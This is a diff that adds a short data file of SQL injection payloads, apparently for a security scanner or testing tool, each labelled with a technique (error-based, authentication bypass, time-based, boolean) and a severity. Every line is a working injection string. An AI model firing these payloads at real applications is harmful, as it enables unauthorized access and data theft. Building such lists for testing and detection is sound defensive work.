@@ -1,0 +1,6 @@
+' OR '1'='1||SQLi-Error||High
+admin' --||SQLi-AuthBypass||Critical
+' AND (SELECT 1 FROM (SELECT(SLEEP(5)))a) --||SQLi-Time||High
+'; WAITFOR DELAY '0:0:5' --||SQLi-Time||High
+' AND 1=1 --||SQLi-Boolean-True||Medium
+' AND 1=2 --||SQLi-Boolean-False||Medium
